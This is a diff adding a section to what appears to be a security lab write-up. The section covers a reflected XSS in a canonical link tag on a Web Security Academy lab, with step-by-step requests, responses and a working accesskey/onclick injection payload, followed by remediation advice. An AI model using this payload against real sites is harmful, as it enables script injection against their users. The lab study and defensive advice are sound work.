@@ -561,3 +561,39 @@ In this instance, I discovered a reflected XSS vector that bypasses the WAF by u
 -
 
 ### 15. Reflected XSS in canonical link tag
+In this instance, I discovered that untrusted input from the URL query string is reflected into canonical link tag in the page source. By injecting [accesskey](https://www.w3schools.com/jsref/prop_html_accesskey.asp, "HTML DOM Element accessKey") attribute,  I was able to prove code execution in the page context after pressing the keystroke triggered JavaScript.
+
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+1. I opened the Inspector and found the canonical link in the source code.
+  ~~~
+  <link rel="canonical" href="https://web-security-academy.net/">
+  ~~~
+
+2. I inserted a test string (`?test`) into the URL and saw my input rendered directly in the canonical link.
+  ~~~
+  <link rel="canonical" href="https[://]web-security-academy[.]net/?test">
+  ~~~
+
+3. I then added an `accesskey` attribute to the `<link>` tag, and when the designated key was pressed it triggered the `onclick` event. The results showed:
+  - Spaces in my input were encoded (`%20`) in the URL, but they were rendered as extra encoded spaces (` %20`) in the source code.
+  - A single quotes were encoded (`%27`) in the URL, but they rendered as double quotes in the source code.
+  ~~~
+  Request: /?test' accesskey='x' onclick='prompt(test)
+  Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" %20accesskey="x" %20onclick="prompt(test)">
+  ~~~
+
+4. To bypass this, I removed the spaces from my input. After pressing Ctrl+Alt+X, a popup displayed my message.
+  ~~~
+  Request: /?test'accesskey='x'onclick='prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)
+  Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" accesskey="x" onclick="prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)">
+  ~~~
+
+</details>
+
+**Suggestion**: Don't reflect user input directly into HTML, ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. [Sanitize & validate input](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation), if input used as a URL, validate against an allow-list of permitted patterns. Use [DOM methods](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-6-populate-the-dom-using-safe-javascript-functions-or-properties) to create and manage elements, attributes, and text nodes safely. Add/strengthen [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP). Lastly, use [HTTP security headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#security-headers).
+
+-
+
+### 16. Reflected XSS into a JavaScript string with single quote and backslash escaped
